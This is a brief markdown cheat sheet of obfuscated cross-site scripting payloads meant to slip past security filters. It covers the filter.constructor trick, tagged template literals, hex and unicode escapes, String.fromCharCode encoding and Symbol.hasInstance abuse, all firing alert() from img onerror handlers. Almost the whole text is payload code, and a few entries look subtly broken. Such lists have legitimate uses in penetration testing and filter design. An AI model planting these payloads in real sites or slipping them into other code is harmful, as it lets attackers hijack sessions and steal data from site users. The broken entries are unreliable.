# Obfuscated XSS

The art of hiding Cross-Site Scripting (XSS) payloads to bypass security filters.

Goodbye!

```
<img src onerror=alert`1`>
```

----------

### filter.constructor

```
<img src onerror="[].filter.constructor('('+('al'+'ert')+')(1)')()">
<img src onerror="[].filter.constructor(''+String.fromCharCode(97,108,101,114,116)+'(1)')()">
<img src onerror="[].filter.constructor('\u0061\u006c\u0065\u0072\u0074(1)')()">
<img src onerror="[].filter.constructor('\x61\x6c\x65\x72\x74(1)')()">
<img src onerror="[]['filter']['constructor'](('al'+[]['filter']['name'])[0]+('ert')(1))">
```

### Simple Tagged template literal abuse

```
<img src=x onerror="Function`al\x65rt\x28'XSS'\x29`()">
```

### Indirect function call obfuscation with Symbol.hasInstance abuse and instanceof override

```
<img src=x onerror="([][Symbol.hasInstance]=eval,[]instanceof{[Symbol.hasInstance](){('al'+'ert')(0)}})">
```

### Function constructor via template literal with Hex-encoded payload

```
<img src=x onerror="Function`\x61\x6c\x65\x72\x74\x28\x31\x29`()">
```

## Function constructor with String.fromCharCode Encoding

```
<img src=x onerror="(Function(String.fromCharCode(115,101,116,84,105,109,101,111,117,116,40,39,97,108,101,114,116,40,49,41,39,41)))()">
```

